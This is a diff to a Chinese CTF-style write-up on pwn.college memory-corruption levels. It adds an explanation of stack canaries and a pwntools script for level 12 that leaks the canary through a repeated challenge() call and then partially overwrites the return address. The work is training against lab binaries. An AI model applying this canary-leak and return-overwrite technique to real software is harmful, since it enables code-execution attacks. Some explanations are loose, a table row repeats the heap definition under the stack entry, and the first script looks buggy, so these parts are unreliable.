@@ -172,7 +172,19 @@ while True:
 | 堆     | 堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。 |
 | 栈     | 堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。 |
 
-### 
+### 4. canary保护机制
+
+典型栈金丝雀（`Stack Canary`）是一种保护机制，用于检测和防止栈溢出攻击。金丝雀值通常存储在 `fs 段寄存器`指向的内存区域中。典型的做法是将金丝雀值存储在` fs:[0x28]` 这样的固定偏移位置上，函数在进入和退出时会对该值进行检查。
+
+`fs 段寄存器`是 x86 和 x86-64 架构中的一个段寄存器，用于实现线程局部存储（Thread Local Storage, TLS）和其他与内存段相关的功能。在现代操作系统中，特别是在 64 位环境下，fs 段寄存器通常用于存储与线程和进程相关的重要数据结构，如线程控制块（Thread Control Block, TCB）和进程控制块（Process Control Block, PCB）。
+
+
+栈金丝雀的值通常是随机的，操作系统在每次程序启动时会生成一个新的随机值，并将其存储在 `fs:28h`（或其他类似位置，具体取决于操作系统和编译器实现）处。
+
+**在同一程序的生命周期内，如果没有特殊的重置或更改机制，fs:28h 的值通常保持不变。这意味着对于同一进程内的函数重复调用，栈金丝雀的值是一样的。**
+
+还有一个特点，`canary`这个值的最低位通常是\x00开头的。栈金丝雀（canary）的最低位通常设置为 \x00，这是为了防止某些类型的缓冲区溢出攻击。这种设计有助于检测某些字符串复制函数（如 strcpy、strcat 等）未能正确处理缓冲区末尾的情况。这些函数通常会在遇到 \x00 时停止复制，因此在缓冲区溢出时，未能覆盖整个栈金丝雀的情况将更容易被检测到。
+
 
 ## level 1
 
@@ -800,3 +812,80 @@ p.interactive()
 ```
 
 ## level 12
+
+这一关开启canary保护，不能直接通过缓冲区溢出复写返回地址，因为这样一定会覆盖掉canary的校验值，导致程序后续运行失败。
+
+但是通过反编译以后发现，存在`challenge`的重复调用，这就意味着，我们可以通过第一次challenge的调用后`puts()`打印的回显，获取canary的值。然后在第二次调用中，复写函数的返回地址。这样，在知道`cannary`值的前提下， 不会触发段溢出的报错。还是跟之前一样，因为不是position independent，所以只复写两个字节，然后重试。
+
+```c
+  if ( strstr((const char *)buf, "REPEAT") )
+  {
+    puts("Backdoor triggered! Repeating challenge()");
+    return challenge(v9, v8, v7); 
+  }
+  else
+  {
+    puts("Goodbye!");
+    return 0LL;
+  }
+```
+
+
+```python
+from pwn import *
+
+elf = ELF("/challenge/babymem_level12.1")
+p = process("/challenge/babymem_level12.1")
+buffer_size = 0x68 + 1                      # 1 是为了填补canary最低位的0x00
+p.sendline(f"{buffer_size}")
+p.send(b'REPEAT' +  b'A' * (0x68 - 6 + 1))  # 6 是REPEAT所占的字节数
+output = p.recvall()
+print(output)
+match = re.search(r'^(You said: REPEATA+.*?)$', output.decode('latin-1'), re.MULTILINE)
+if match:
+    line = match.group(1)
+    cancary =  line.encode('latin-1')[0x68 + 1 + 10 : 0x68 + 1 + 7 + 10]
+    hex_str = ''.join(f'{byte:02x}' for byte in cancary[::-1]) + "00"
+    cancary_value = p64(int(hex_str, 16))
+    print(cancary_value)
+else:
+    print("No matching line found")
+
+buffer_size = 0x68 + 8 + 8 + 2
+p.sendline(f"{buffer_size}")
+p.send(b'A'* 0x68 + cancary_value + b'A' * 8 + b'\x6A' + b'\x1B')
+p.interactive()
+exit()
+
+
+
+elf = ELF("/home/hacker/memory/level12/babymem_level12.0")
+p = process("/home/hacker/memory/level12/babymem_level12.0")
+buffer_size = 0x78 + 1
+p.sendline(f"{buffer_size}")
+p.send(b'REPEAT' +  b'A' * (0x78 - 6 + 1))
+output = p.recvuntil(b'Backdoor triggered! Repeating challenge()')
+
+match = re.search(r'^(You said: REPEATA+.*?)$', output.decode('latin-1'), re.MULTILINE)
+if match:
+    line = match.group(1)
+    cancary =  line.encode('latin-1')[0x78 + 1 + 10 : 0x78+1+7 + 10]
+    hex_str = ''.join(f'{byte:02x}' for byte in cancary[::-1]) + "00"
+    cancary_value = p64(int(hex_str, 16))
+else:
+    print("No matching line found")
+
+buffer_size = 0x78 + 8 + 8 + 2
+p.sendline(f"{buffer_size}")
+p.send(b'A'* 0x78 + cancary_value + b'A' * 8 + b'\x37' + b'\x24')
+p.interactive()
+exit()
+
+```
+
+
+
+## level 13
+
+
+## level 14
